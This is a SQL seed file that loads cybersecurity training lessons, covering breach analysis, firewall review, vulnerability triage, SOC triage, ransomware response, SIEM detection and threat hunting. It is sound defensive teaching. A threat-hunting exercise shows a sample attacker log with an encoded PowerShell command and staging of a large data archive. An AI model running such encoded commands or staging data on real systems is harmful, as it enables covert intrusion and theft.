- What the problem is (in plain language)
- What the risk is if nothing is done
- What you recommend and how long it will take

**Task 2 — What NOT to write.** Rewrite this bad email opening to be clear and professional:
> "Hey boss, backups are broken, the cron job failed cos the mount point changed after the OS update, need root access to fix the fstab entry ASAP or we'll lose everything."

**Task 3 — Follow-up.** After the fix, you need to confirm it worked. Write a one-sentence status update for your manager.

$md$, 20, 3);

-- ========== BH-FOUND-1: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Introduction to Cybersecurity (practical at order 3)
('b0000000-0000-4000-8000-000000000011', 'Practical: Analyse a Breach Report',
 'Classify threats, actors, and impacts from a real-world-style breach report.',
$md$
# Practical: Analyse a Breach Report

## Scenario

Read this simplified breach report:

> **Incident Summary — MegaRetail, Inc.**
> On March 15, a phishing email was sent to the finance department. An employee clicked a link and entered their credentials on a fake login page. The attacker used the stolen credentials to access the corporate VPN, then moved to the payment processing server. Over 3 days, the attacker exfiltrated 2.1 million customer credit card records. The breach was discovered when a bank notified MegaRetail of fraudulent transactions.

## Tasks

**Task 1 — Identify the elements.** Fill in the table:

| Element | Your Answer |
|---------|-------------|
| Threat actor type | ? |
| Initial attack vector | ? |
| Vulnerability exploited | ? |
| Asset compromised | ? |
| Impact | ? |
| How was it detected? | ? |

**Task 2 — Map to CIA.** Which element(s) of the CIA triad were violated? Explain each.

**Task 3 — One control.** Name one security control that could have prevented or detected this breach earlier. Explain how.

$md$, 25, 3),

-- Module 2: Hardware and Mobile Devices (practical at order 3)
('b0000000-0000-4000-8000-000000000012', 'Practical: Hardware Troubleshooting',
 'Diagnose hardware problems from symptoms and recommend solutions.',
$md$
# Practical: Hardware Troubleshooting

## Scenario

You are tier-1 IT support. Three tickets arrive:

**Ticket 1:** "My laptop is extremely slow. Programs take minutes to open and the fan runs constantly."
**Ticket 2:** "My desktop won't turn on at all. When I press the power button, nothing happens — no lights, no fan."
**Ticket 3:** "My phone keeps disconnecting from Wi-Fi and Bluetooth headphones won't pair."

## Tasks

**Task 1 — Diagnose.** For each ticket, identify the most likely hardware cause and one alternative cause.

**Task 2 — Troubleshooting steps.** For Ticket 1, write 4 troubleshooting steps in the order you would perform them.

**Task 3 — Mobile security.** For Ticket 3, the user is a sales rep who uses the phone for company email and customer data. Name two mobile security risks if the device is malfunctioning and one policy you would recommend.

$md$, 20, 3),

-- Module 3: Networking Fundamentals (practical at order 3)
('b0000000-0000-4000-8000-000000000013', 'Practical: TCP/IP Packet Analysis',
 'Trace a packet through the OSI/TCP-IP layers and identify protocols.',
$md$
# Practical: TCP/IP Packet Analysis

## Scenario

Your team lead hands you a summary from a packet capture and asks you to interpret it.

**Captured data (simplified):**
```
Source IP:   192.168.1.50
Dest IP:     93.184.216.34
Protocol:    TCP
Source Port: 49821
Dest Port:   443
Flags:       SYN
Payload:     (empty — handshake)
```

## Tasks

**Task 1 — Identify.** Answer these questions about the captured packet:
1. Which device initiated the connection — the source or the destination?
2. What well-known service runs on port 443?
3. What does the SYN flag mean?
4. Is the source IP a private or public address? How do you know?

**Task 2 — OSI layers.** Map each piece of data to the correct OSI layer:

| Data | OSI Layer |
|------|-----------|
| Source/Destination IP address | ? |
| Source/Destination Port | ? |
| SYN flag | ? |
| Ethernet MAC address (not shown) | ? |
| HTTP request (not shown, would come after handshake) | ? |

**Task 3 — Common ports.** Fill in the service or port:

| Port | Service |
|------|---------|
| 22 | ? |
| 53 | ? |
| 80 | ? |
| ? | RDP |
| ? | SMTP |

$md$, 25, 3),

-- Module 4: Security Concepts and Best Practices (practical at order 3)
('b0000000-0000-4000-8000-000000000014', 'Practical: Map Controls to CIA',
 'Classify security controls and map them to the CIA triad.',
$md$
# Practical: Map Controls to CIA

## Scenario

You are helping a small accounting firm improve its security. The firm owner asks: "Which of our security measures protect what?" Map their controls to the CIA triad.

## Tasks

**Task 1 — Map controls.** For each control, state which element of the CIA triad it primarily protects and whether it is **Technical**, **Administrative**, or **Physical**.

| Control | CIA Element | Control Type |
|---------|-------------|--------------|
| Full-disk encryption on laptops | ? | ? |
| Nightly backup to offsite storage | ? | ? |
| Hashing financial reports before emailing | ? | ? |
| Security awareness training | ? | ? |
| Locked server room with badge access | ? | ? |
| Firewall blocking unused ports | ? | ? |
| Acceptable use policy | ? | ? |

**Task 2 — Find the gap.** Based on the controls above, which CIA element is least covered? Recommend one additional control for it.

**Task 3 — Scenario.** An employee leaves their laptop (encrypted) in a taxi. Walk through the impact on Confidentiality, Integrity, and Availability.

$md$, 25, 3);

-- ========== BH-FOUND-2: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Network Services and Protocols (practical at order 3)
('b0000000-0000-4000-8000-000000000021', 'Practical: DNS and Protocol Investigation',
 'Interpret DNS records and identify protocols by port and behaviour.',
$md$
# Practical: DNS and Protocol Investigation

## Scenario

You are a junior network admin. Your team lead gives you a DNS zone file extract and asks you to interpret it.

```
example.com.       IN  A       93.184.216.34
mail.example.com.  IN  A       93.184.216.40
example.com.       IN  MX  10  mail.example.com.
example.com.       IN  TXT     "v=spf1 include:_spf.google.com ~all"
www.example.com.   IN  CNAME   example.com.
```

## Tasks

**Task 1 — Interpret each record.** Explain what each DNS record does in plain English.

**Task 2 — Troubleshooting.** A user reports: "I can reach the website at 93.184.216.34 but not at www.example.com." What is the most likely cause?

**Task 3 — Port matching.** Match each protocol to its default port:

| Protocol | Port |
|----------|------|
| DNS | ? |
| HTTP | ? |
| HTTPS | ? |
| SSH | ? |
| FTP (control) | ? |
| DHCP (server) | ? |

$md$, 25, 3),

-- Module 2: Network Security and Hardening (practical at order 3)
('b0000000-0000-4000-8000-000000000022', 'Practical: Firewall Rule Review',
 'Review a firewall rule set, find weaknesses, and write corrected rules.',
$md$
# Practical: Firewall Rule Review

## Scenario

You are auditing the perimeter firewall of a small company. The firewall processes rules top-to-bottom (first match wins). Here is the current rule set:

| # | Source | Destination | Port | Protocol | Action |
|---|--------|-------------|------|----------|--------|
| 1 | Any | Web Server (10.0.1.10) | 443 | TCP | Allow |
| 2 | Any | Any | Any | Any | Allow |
| 3 | Any | DB Server (10.0.2.20) | 3306 | TCP | Deny |
| 4 | Internal (10.0.0.0/8) | Any | 80, 443 | TCP | Allow |
| 5 | Any | Any | Any | Any | Deny |

## Tasks

**Task 1 — Find the problems.** Identify at least three security issues with this rule set.

**Task 2 — Rewrite.** Write a corrected rule set (5–7 rules) that allows only what is needed: web traffic to the web server, internal users to browse the internet, and blocks everything else.

**Task 3 — IDS vs IPS.** The company also asks about intrusion detection. In two sentences each, explain the difference between IDS and IPS and state where each would sit relative to the firewall.

$md$, 25, 3),

-- Module 3: Operating System Security (practical at order 3)
('b0000000-0000-4000-8000-000000000023', 'Practical: System Hardening Checklist',
 'Build a hardening checklist for Windows and Linux servers.',
$md$
# Practical: System Hardening Checklist

## Scenario

Your company is deploying two new servers: one **Windows Server** for file sharing and one **Linux (Ubuntu)** server for a web application. Both will be internet-accessible. You are asked to create a hardening checklist before they go live.

## Tasks

**Task 1 — Windows hardening.** List 6 hardening steps for the Windows file server, in the order you would perform them.

**Task 2 — Linux hardening.** List 6 hardening steps for the Linux web server.

**Task 3 — Common to both.** Name three hardening actions that apply to both Windows and Linux regardless of OS.

**Task 4 — Spot the mistake.** A colleague's hardening notes say: "Disable the firewall because the application doesn't work with it on." What would you say?

$md$, 25, 3);

-- ========== BH-CYBER-2: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: General Security Concepts (practical at order 4)
('b0000000-0000-4000-8000-000000000031', 'Practical: Cryptography and Controls Challenge',
 'Choose appropriate encryption, hashing, and controls for business scenarios.',
$md$
# Practical: Cryptography and Controls Challenge

## Scenario

You are a security analyst at a healthcare company. The IT director presents three business requirements and asks you to recommend the right cryptographic approach and controls.

## Tasks

**Task 1 — Match the crypto.** For each requirement, state whether you would use **symmetric encryption**, **asymmetric encryption**, **hashing**, or **digital signatures** — and name a specific algorithm.

1. Encrypt patient records stored in the database at rest.
2. Verify that a downloaded software update has not been tampered with.
3. Allow two offices to exchange encrypted emails where neither has shared a secret key in advance.
4. Store user passwords securely in the authentication database.

**Task 2 — TLS handshake.** In 4–5 steps, describe what happens during a TLS handshake when a browser connects to https://hospital.example.com.

**Task 3 — Control selection.** The hospital's lobby has a public Wi-Fi kiosk. Patients use it to access the internet. Name three controls you would implement to protect the hospital network from this kiosk.

$md$, 30, 4),

-- Module 2: Threats and Vulnerabilities (practical at order 4)
('b0000000-0000-4000-8000-000000000032', 'Practical: Vulnerability Triage Exercise',
 'Prioritise vulnerability scan results and recommend remediation.',
$md$
# Practical: Vulnerability Triage Exercise

## Scenario

Your vulnerability scanner returned these results for a production e-commerce environment:

| # | Vulnerability | CVSS Score | Affected Asset | Exploitable? |
|---|--------------|------------|----------------|--------------|
| 1 | Apache Struts RCE (CVE-2023-XXXX) | 9.8 | Web server (internet-facing) | Yes — public exploit |
| 2 | SSL/TLS using TLS 1.0 | 5.3 | Payment API server | No known exploit, but weak crypto |
| 3 | Default admin credentials on printer | 6.5 | Office printer (internal) | Yes — default password |
| 4 | Missing Windows patches (30 days old) | 7.5 | Internal file server | Possible — depends on patch |
| 5 | jQuery 2.x used on public website | 4.3 | Web server | Limited — requires XSS chain |

## Tasks

**Task 1 — Prioritise.** Rank these from most urgent to least. Justify your top pick.

**Task 2 — Remediation plan.** For the top two vulnerabilities, write a remediation action, owner, and deadline.

**Task 3 — Risk acceptance.** Your manager says: "The printer is internal, so ignore it." Write a 2-sentence response explaining why you disagree (or agree).

**Task 4 — CVSS interpretation.** Explain in plain English what a CVSS score of 9.8 means and why it matters for prioritisation.

$md$, 30, 4),

-- Module 3: Security Architecture and Operations (practical at order 4)
('b0000000-0000-4000-8000-000000000033', 'Practical: Secure Architecture Review',
 'Review a network architecture for security weaknesses and recommend improvements.',
$md$
# Practical: Secure Architecture Review

## Scenario

A startup, **QuickLend** (online lending), presents this architecture for security review:

- **Public website** and **customer API** run on a single server in a public subnet.
- The **application database** (MySQL) is on the same server as the API.
- All employees connect via a single **flat internal network** — no segmentation.
- The company uses a single **admin account** shared by 4 IT staff for all server access.
- Logs are stored locally on each server; no central logging.
- Backups are taken weekly to an external USB drive stored in the server room.

## Tasks

**Task 1 — Find the weaknesses.** Identify at least five security architecture problems. For each, explain the risk in one sentence.

**Task 2 — Redesign.** Propose a corrected architecture: where should each component sit (public/private subnet), how should access be segmented, and how should logging work?

**Task 3 — Zero trust.** The CTO asks: "What is zero trust and should we adopt it?" Write a 3-sentence answer.

$md$, 30, 4),

-- Module 4: Security Program Management (practical at order 3)
('b0000000-0000-4000-8000-000000000034', 'Practical: Design a Security Awareness Programme',
 'Build a security awareness and training programme from scratch.',
$md$
# Practical: Design a Security Awareness Programme

## Scenario

**BrightPath Finance** (200 employees) has never had a formal security awareness programme. After a phishing incident where 30% of employees clicked a malicious link, the CISO asks you to design one.

## Tasks

**Task 1 — Programme structure.** Design a 12-month awareness programme. List the activities for each quarter (Q1–Q4) including topics, delivery methods, and target audience.

**Task 2 — Phishing simulation.** Design a phishing simulation test:
- Describe the fake email (subject, sender, content, call to action).
- Define success metrics (what percentages would you track?).
- What happens when an employee clicks the link vs. reports it?

**Task 3 — Policy.** Write 3 key rules from a "Security Awareness and Acceptable Use" policy that every employee must follow.

**Task 4 — Measuring effectiveness.** Name three metrics you would report to the CISO after 12 months to show the programme is working.

$md$, 30, 3);

-- ========== BH-OPS-2: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Security Operations and Vulnerability Management (practical at order 3)
('b0000000-0000-4000-8000-000000000041', 'Practical: SOC Alert Triage',
 'Prioritise and investigate SOC alerts using real-world-style data.',
$md$
# Practical: SOC Alert Triage

## Scenario

You are a Tier 1 SOC analyst starting your Monday shift. The SIEM shows these five alerts from the weekend:

| # | Time | Alert | Source | Severity | Status |
|---|------|-------|--------|----------|--------|
| 1 | Sat 02:13 | Brute-force SSH — 500 failed attempts in 10 min | External IP → Linux server (public) | High | Open |
| 2 | Sat 14:30 | Antivirus quarantined Trojan on HR laptop | HR-PC-04 | Medium | Auto-resolved |
| 3 | Sun 01:45 | Data exfiltration — 8 GB upload to cloud storage | Finance-PC-11 | Critical | Open |
| 4 | Sun 09:00 | Expired SSL certificate on internal portal | intranet.corp.local | Low | Open |
| 5 | Sun 22:10 | New admin account created — "svc-backup-new" | Domain Controller | High | Open |

## Tasks

**Task 1 — Triage.** Rank the alerts from most to least urgent. Justify your top pick.

**Task 2 — Investigate #3.** The data exfiltration alert is your top priority. List 5 things you would check or do in the first 15 minutes.

**Task 3 — Correlation.** Could alerts #3 and #5 be related? Explain how and what you would check.

**Task 4 — Escalation.** Write a 3-sentence escalation note to the Tier 2 analyst for alert #3.

$md$, 30, 3),

-- Module 2: Incident Response and Recovery (practical at order 3)
('b0000000-0000-4000-8000-000000000042', 'Practical: Incident Response Walkthrough',
 'Walk through each phase of an IR plan for a ransomware scenario.',
$md$
# Practical: Incident Response Walkthrough

## Scenario

At 07:15 on Wednesday, employees at **MedSupply** (medical supply distributor) report that shared drives are inaccessible. The IT team finds ransom notes on 3 file servers: "Your files are encrypted. Pay 5 BTC within 72 hours to decrypt."

Key facts:
- 3 of 5 file servers encrypted; 2 appear unaffected.
- The attacker entry point is unknown.
- Backups run nightly to an off-site location; last verified restore was 2 months ago.
- MedSupply has 200 employees and ships medical supplies to hospitals.

## Tasks

**Task 1 — IR phases.** Walk through each NIST IR phase and state what you would do:

| Phase | Actions |
|-------|---------|
| 1. Preparation (before incident) | ? |
| 2. Detection and Analysis | ? |
| 3. Containment | ? |
| 4. Eradication | ? |
| 5. Recovery | ? |
| 6. Post-Incident / Lessons Learned | ? |

**Task 2 — To pay or not.** The CFO asks: "Should we just pay the ransom?" Give a structured answer (arguments for, against, and your recommendation).

**Task 3 — Communication.** Draft a 3-sentence internal announcement to all employees about the incident.

$md$, 35, 3);

-- ========== BH-SPEC-SOC: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Advanced SOC and SIEM (practical at order 3)
('b0000000-0000-4000-8000-000000000051', 'Practical: SIEM Detection Rule Design',
 'Write SIEM detection rules for common attack patterns.',
$md$
# Practical: SIEM Detection Rule Design

## Scenario

As a SOC engineer, you are tasked with creating detection rules for three attack patterns that your threat intelligence team has flagged. Your SIEM supports rules in a structured format.

## Tasks

**Task 1 — Write detection logic.** For each attack pattern, write the detection rule in plain language (what data source, what condition, what threshold).

**Attack 1: Credential stuffing on the VPN**
- Attacker uses lists of leaked credentials to try many logins.

**Attack 2: Living-off-the-land (PowerShell abuse)**
- Attacker uses PowerShell to download and execute malicious scripts on a compromised endpoint.

**Attack 3: Data staging before exfiltration**
- Attacker compresses large amounts of data into archives before sending them out.

**Task 2 — Reduce false positives.** For each rule, identify one likely source of false positives and how you would tune it.

**Task 3 — MITRE ATT&CK mapping.** Map each of the three attacks to a MITRE ATT&CK tactic and technique.

$md$, 30, 3),

-- Module 2: Threat Hunting and Incident Handling (practical at order 3)
('b0000000-0000-4000-8000-000000000052', 'Practical: Threat Hunting Exercise',
 'Investigate anomalous activity using log extracts and form a hypothesis.',
$md$
# Practical: Threat Hunting Exercise

## Scenario

As a threat hunter, you receive a tip from threat intelligence: an APT group is targeting companies in your industry using compromised service accounts. You decide to hunt proactively. Your SIEM provides these log extracts:

**Log Extract A — Authentication (last 7 days):**
```
svc-report   | Login | DC-01 | Mon 08:00 | Success | 10.0.1.50
svc-report   | Login | DC-01 | Mon 08:00 | Success | 10.0.1.50
svc-report   | Login | FILE-01 | Wed 02:17 | Success | 10.0.3.99
svc-report   | Login | DB-01 | Wed 02:22 | Success | 10.0.3.99
svc-report   | Login | DC-01 | Thu 08:00 | Success | 10.0.1.50
admin-jdoe   | Login | DC-01 | Wed 02:30 | Success | 10.0.3.99
```

**Log Extract B — Process creation (FILE-01, Wed 02:18):**
```
Parent: svc-report
Process: cmd.exe → powershell.exe -enc [Base64string]
Action: Created C:\Temp\data_export.zip (2.1 GB)
```

## Tasks

**Task 1 — Form a hypothesis.** Based on the logs, write your threat hunting hypothesis in one sentence.

**Task 2 — Identify indicators.** List at least 4 indicators of compromise (IOCs) or suspicious behaviours from the logs.

**Task 3 — Investigate.** What 5 additional queries or checks would you run to confirm or refute your hypothesis?

**Task 4 — Respond.** If confirmed, write the first 4 containment actions.

$md$, 35, 3);

-- ========== BH-ADV: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Security and Risk Management (practical at order 3)
('b0000000-0000-4000-8000-000000000061', 'Practical: Strategic Risk Presentation',
 'Prepare a risk governance briefing for executive leadership.',
$md$
# Practical: Strategic Risk Presentation

## Scenario

You are the Head of Information Security at **TrustBank**, a mid-size retail bank. The board's Risk Committee meets quarterly. You need to prepare a strategic security risk briefing.

**Context:**
- TrustBank has 2,000 employees and 500,000 customers.
- Regulatory environment: banking regulations, data protection laws, PCI DSS.
- Current risk appetite: "Moderate — we accept some operational risk but have zero tolerance for customer data loss."
- Last quarter: one material phishing incident (contained), two audit findings (one major: third-party risk management gaps).
- Budget request: you want to hire 2 additional security staff and implement a TPRM (third-party risk management) platform.

## Tasks

**Task 1 — Risk appetite statement.** The current statement is vague. Rewrite it as a formal risk appetite statement with specific parameters (e.g. quantitative thresholds).

**Task 2 — Board slide content.** Write the content for 3 slides (title + 3–4 bullet points each):
- Slide 1: Current risk posture
- Slide 2: Top 3 risks
- Slide 3: Investment request

**Task 3 — Objection handling.** A board member asks: "Why can't existing staff handle third-party risk?" Write your response (3–4 sentences).

$md$, 35, 3),

-- Module 2: Security Architecture and Leadership (practical at order 3)
('b0000000-0000-4000-8000-000000000062', 'Practical: Security Strategy Roadmap',
 'Design a 3-year security strategy roadmap for an organisation.',
$md$
# Practical: Security Strategy Roadmap

## Scenario

You have been hired as CISO of **HealthFirst**, a health insurance company (800 employees, 1.2 million members). A security maturity assessment reveals:

| Domain | Current Maturity (1–5) | Target (3 years) |
|--------|----------------------|-------------------|
| Governance and risk | 2 | 4 |
| Identity and access | 2 | 4 |
| Data protection | 1 | 3 |
| Security operations | 2 | 4 |
| Incident response | 1 | 3 |
| Third-party risk | 1 | 3 |

Budget: $500,000 in Year 1, $400,000 in Year 2, $350,000 in Year 3.

## Tasks

**Task 1 — Prioritise.** Which 3 domains would you focus on in Year 1? Justify.

**Task 2 — Roadmap.** Fill in the high-level initiatives for each year:

| Year | Focus Areas | Key Initiatives | Budget Allocation |
|------|-------------|-----------------|-------------------|
| Year 1 | ? | ? | $500,000 |
| Year 2 | ? | ? | $400,000 |
| Year 3 | ? | ? | $350,000 |

**Task 3 — Quick wins.** Name 3 "quick wins" (achievable in the first 90 days, low cost) that demonstrate progress to the board.

**Task 4 — Success metrics.** Define 3 metrics you would track over the 3 years to measure the programme's success.

$md$, 40, 3);

-- ==================================================================================
-- CERTIFICATION GAP-FILL LESSONS — Additional theory lessons for cert alignment
-- ==================================================================================

-- ========== BH-FOUND-1: CompTIA A+ gap-fill ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

('b0000000-0000-4000-8000-000000000012', 'Troubleshooting Methodology',
 'The CompTIA troubleshooting model and how to apply it systematically.',
$md$
# Troubleshooting Methodology

## Introduction

CompTIA A+ emphasises a structured approach to troubleshooting. Rather than guessing, technicians follow a repeatable process to diagnose and resolve problems efficiently.

## The CompTIA Troubleshooting Model

1. **Identify the problem.** Gather information from the user: What happened? When did it start? What changed? Check logs, error messages, and recent updates.

2. **Establish a theory of probable cause.** Based on symptoms, form a hypothesis. Start with the most common or simplest explanation ("Is it plugged in?") before considering complex causes.

3. **Test the theory.** If the theory is confirmed, proceed. If not, go back to step 2 and form a new theory.

4. **Establish a plan of action.** Determine how to fix the problem. Consider impact: will the fix require downtime? Does it need approval?

5. **Implement the solution (or escalate).** Apply the fix. If the fix is beyond your skill or authority, escalate to a senior technician or specialist.

6. **Verify full system functionality.** Confirm the fix worked and did not break anything else. Test related functions.

7. **Document findings, actions, and outcomes.** Record what the problem was, what caused it, and how it was resolved. This builds a knowledge base for future issues.

## Example

A user reports: "My laptop cannot connect to Wi-Fi."

1. Identify: Ask if it was working before, check if other devices connect, check for airplane mode.
2. Theory: Airplane mode is on, or the Wi-Fi driver crashed.
3. Test: Toggle airplane mode off. If Wi-Fi returns, theory confirmed.
4. Plan: If airplane mode was not the issue, restart the network adapter.
5. Implement: Disable and re-enable the adapter.
6. Verify: Connect to Wi-Fi, browse a website, confirm stable connection.
7. Document: "Wi-Fi adapter required restart after driver update. Reconnected successfully."

## Key takeaway

A structured troubleshooting method saves time, avoids unnecessary changes, and creates a record for future reference. Certification exams test your ability to follow this model step by step.

## Exam alignment

CompTIA A+ Core 2 (220-1102): Domain 3 — Software Troubleshooting; Domain 4 — Operational Procedures (documentation, change management).
$md$, 18, 4),

('b0000000-0000-4000-8000-000000000011', 'Virtualisation and Cloud Concepts',
 'Basics of virtual machines, hypervisors, and cloud service models for A+ alignment.',
$md$
# Virtualisation and Cloud Concepts

## Introduction

Modern IT relies heavily on virtualisation and cloud computing. CompTIA A+ expects technicians to understand the basics of both — what they are, why they matter, and how they differ.

## Virtualisation

**Virtualisation** creates a software-based version of hardware. A single physical server can run multiple **virtual machines (VMs)**, each with its own operating system and applications.

- **Hypervisor:** The software that creates and manages VMs.
  - **Type 1 (bare-metal):** Runs directly on hardware. Examples: VMware ESXi, Microsoft Hyper-V Server.
  - **Type 2 (hosted):** Runs on top of an existing OS. Examples: VirtualBox, VMware Workstation.
- **Benefits:** Better resource utilisation, easy testing environments, snapshots for recovery.
- **In cybersecurity:** VMs are used to create sandboxes (isolated environments to safely analyse malware), test patches before deployment, and run security labs.

## Cloud Service Models

| Model | What you get | You manage | Provider manages | Example |
|-------|-------------|------------|-----------------|---------|
| **IaaS** | Virtual machines, storage, networking | OS, apps, data | Hardware, virtualisation | AWS EC2, Azure VMs |
| **PaaS** | Platform to build and run apps | Apps, data | OS, runtime, hardware | Heroku, Azure App Service |
| **SaaS** | Complete application | Data, user access | Everything else | Microsoft 365, Google Workspace |

## Cloud Deployment Models

- **Public cloud:** Shared infrastructure (AWS, Azure, GCP). Cost-effective, scalable.
- **Private cloud:** Dedicated to one organisation. More control, higher cost.
- **Hybrid cloud:** Combination of public and private — sensitive data on-prem, scalable workloads in the cloud.

## Key takeaway

Virtualisation lets one machine do the work of many; cloud computing lets organisations use computing as a service. Technicians need to understand both to support modern workplaces.

## Exam alignment

CompTIA A+ Core 1 (220-1101): Domain 4.1 — Cloud computing concepts; virtualisation (hypervisor types, resource allocation).
$md$, 20, 3);

-- ========== BH-FOUND-2: CompTIA Network+ gap-fill ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

('b0000000-0000-4000-8000-000000000021', 'Subnetting Basics',
 'IP subnetting fundamentals for Network+ alignment.',
$md$
# Subnetting Basics

## Introduction

Subnetting divides a large network into smaller, more manageable sub-networks. It is a core Network+ topic and essential for network security (segmentation).

## Why Subnet?

- **Performance:** Smaller broadcast domains reduce unnecessary traffic.
- **Security:** Isolate sensitive systems (e.g. finance VLAN, guest Wi-Fi) so a breach in one segment does not spread.
- **Organisation:** Group devices logically by department or function.

## Subnet Mask Basics

An IP address has two parts: **network** and **host**. The subnet mask tells you where the boundary is.

| CIDR | Subnet Mask | Usable Hosts | Common Use |
|------|-------------|-------------|------------|
| /24 | 255.255.255.0 | 254 | Small office |
| /25 | 255.255.255.128 | 126 | Department VLAN |
| /26 | 255.255.255.192 | 62 | Small team |
| /27 | 255.255.255.224 | 30 | Point-to-point or lab |
| /30 | 255.255.255.252 | 2 | Router-to-router link |

## How to Subnet (Simple Method)

Given: 192.168.1.0/24 — split into 4 equal subnets.

1. /24 has 256 addresses. 256 ÷ 4 = 64 addresses per subnet → /26.
2. Subnets:
   - 192.168.1.0/26 (hosts .1–.62, broadcast .63)
   - 192.168.1.64/26 (hosts .65–.126, broadcast .127)
   - 192.168.1.128/26 (hosts .129–.190, broadcast .191)
   - 192.168.1.192/26 (hosts .193–.254, broadcast .255)

## Security Relevance

Subnetting is the foundation of **network segmentation** — a key security control. Place servers, workstations, and IoT devices on separate subnets with firewall rules between them.

## Key takeaway

Subnetting divides networks for performance, organisation, and security. Know how to calculate subnet boundaries and host ranges for the exam.

## Exam alignment

CompTIA Network+ (N10-009): Domain 1.4 — IP addressing and subnetting.
$md$, 25, 4),

('b0000000-0000-4000-8000-000000000022', 'Wireless Standards and VPN Types',
 'Wi-Fi standards (802.11) and VPN technologies for Network+ alignment.',
$md$
# Wireless Standards and VPN Types

## Introduction

Wireless networking and VPNs are essential for modern network infrastructure and security. Network+ covers both topics across multiple domains.

## Wireless Standards (802.11)

| Standard | Frequency | Max Speed | Range | Notes |
|----------|-----------|-----------|-------|-------|
| 802.11a | 5 GHz | 54 Mbps | Short | Older, less interference |
| 802.11b | 2.4 GHz | 11 Mbps | Medium | Legacy, slow |
| 802.11g | 2.4 GHz | 54 Mbps | Medium | Backward compatible with b |
| 802.11n (Wi-Fi 4) | 2.4 + 5 GHz | 600 Mbps | Medium–Long | MIMO, dual-band |
| 802.11ac (Wi-Fi 5) | 5 GHz | 6.9 Gbps | Medium | MU-MIMO, common today |
| 802.11ax (Wi-Fi 6/6E) | 2.4 + 5 + 6 GHz | 9.6 Gbps | Medium–Long | OFDMA, better in dense areas |

## Wireless Security Protocols

- **WPA2-Personal:** Pre-shared key (PSK); suitable for home/small office.
- **WPA2-Enterprise:** Uses RADIUS server for authentication; per-user credentials.
- **WPA3:** Stronger encryption (SAE), forward secrecy, resistant to offline dictionary attacks.
- **Avoid:** WEP (broken), WPA (weak TKIP).

## VPN Types

| VPN Type | Description | Use Case |
|----------|-------------|----------|
| **Remote access VPN** | Individual connects to corporate network over the internet | Employees working from home |
| **Site-to-site VPN** | Connects two entire networks (e.g. branch to HQ) | Linking office locations |
| **SSL/TLS VPN** | Runs over HTTPS (port 443); browser-based or lightweight client | Easy deployment, firewall-friendly |
| **IPSec VPN** | Operates at Layer 3; uses IKE for key exchange; supports tunnel and transport mode | Traditional, strong encryption |

## Key takeaway

Know the wireless standards (speed, frequency, security), and understand VPN types and when to use each. Both are heavily tested on Network+.

## Exam alignment

CompTIA Network+ (N10-009): Domain 2.3 — Wireless standards; Domain 3.3 — Remote access and VPN.
$md$, 22, 4);

-- ========== BH-CYBER-2: Security+ / ISC² CC gap-fill ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

('b0000000-0000-4000-8000-000000000032', 'Social Engineering in Depth',
 'Common social engineering attacks, indicators, and defences aligned to Security+.',
$md$
# Social Engineering in Depth

## Introduction

Social engineering exploits human psychology rather than technical vulnerabilities. It is one of the most effective attack vectors and a major focus of both Security+ and ISC² CC exams.

## Common Social Engineering Attacks

| Attack | Description | Example |
|--------|-------------|---------|
| **Phishing** | Mass email with malicious link or attachment | "Your account will be suspended — click here to verify." |
| **Spear phishing** | Targeted phishing at a specific individual | Email to the CFO referencing a real invoice |
| **Whaling** | Spear phishing targeting executives | Fake legal notice to the CEO |
| **Vishing** | Voice phishing (phone call) | "This is your bank — please confirm your PIN." |
| **Smishing** | SMS phishing | "Your package is delayed — click to reschedule." |
| **Pretexting** | Creating a fabricated scenario to gain trust | Attacker calls as "IT support" to get a password |
| **Baiting** | Offering something enticing | USB drive labelled "Salaries 2026" left in the car park |
| **Tailgating** | Following an authorised person through a secured door | Carrying boxes and asking someone to hold the door |
| **Watering hole** | Compromising a website the target group visits | Injecting malware into an industry news site |

## Indicators of Social Engineering

- **Urgency or fear:** "Act now or lose access!"
- **Authority:** Impersonating a manager, CEO, or IT department.
- **Unusual requests:** Asking for credentials, wire transfers, or sensitive data outside normal process.
- **Unsolicited contact:** Phone call or email you did not expect from an unknown sender.

## Defences

1. **Security awareness training** — regular, with phishing simulations.
2. **Verification procedures** — call back on a known number before acting on sensitive requests.
3. **Technical controls** — email filtering, anti-phishing tools, MFA (limits impact of stolen credentials).
4. **Physical controls** — badge access, no tailgating policy, visitor management.
5. **Reporting culture** — make it easy and safe to report suspicious contacts.

## Key takeaway

Social engineering targets people, not systems. Defence requires a combination of awareness, verification processes, and technical controls.

## Exam alignment

CompTIA Security+ (SY0-701): Domain 2.2 — Social engineering techniques. ISC² CC: Domain 1 — Security threats (social engineering).
$md$, 22, 5),

('b0000000-0000-4000-8000-000000000034', 'Business Continuity and Disaster Recovery',
 'BCP/DRP planning essentials aligned to Security+ and ISC² CC.',
$md$
# Business Continuity and Disaster Recovery

## Introduction

Business continuity planning (BCP) and disaster recovery planning (DRP) ensure an organisation can survive disruptions. Both Security+ and ISC² CC test these concepts.

## Key Definitions

- **BCP (Business Continuity Plan):** How the organisation will continue operating during and after a disruption. Covers people, processes, technology, and facilities.
- **DRP (Disaster Recovery Plan):** A subset of BCP focused on restoring IT systems and data after a disaster.
- **BIA (Business Impact Analysis):** Identifies critical business functions, the impact of their disruption, and recovery priorities.

## Important Metrics

| Metric | Definition | Example |
|--------|-----------|---------|
| **RTO (Recovery Time Objective)** | Maximum acceptable downtime | "Email must be restored within 4 hours" |
| **RPO (Recovery Point Objective)** | Maximum acceptable data loss (measured in time) | "We can lose at most 1 hour of transactions" |
| **MTTR (Mean Time to Repair)** | Average time to fix a component | 2-hour average server repair time |
| **MTBF (Mean Time Between Failures)** | Average time a component runs before failing | Hard drive MTBF: 100,000 hours |

